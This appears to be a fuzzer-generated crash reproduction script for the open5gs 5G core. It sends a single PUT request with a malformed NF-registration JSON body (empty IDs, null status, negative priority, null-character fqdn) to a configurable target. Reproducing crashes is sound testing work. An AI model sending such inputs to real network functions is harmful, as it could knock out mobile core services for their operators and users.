#!/usr/bin/env python3
# Crash reproduction for open5gs-ausf (info)
# Detected: Sat May  9 01:39:49 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/UPF-fuzz-1237'
body = b'{"nfInstanceId": "", "nfType": "", "nfStatus": null, "ipv4Addresses": [], "fqdn": "\\\\u0000", "priority": -1, "capacity": 200, "load": 50, "nfServices": []}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
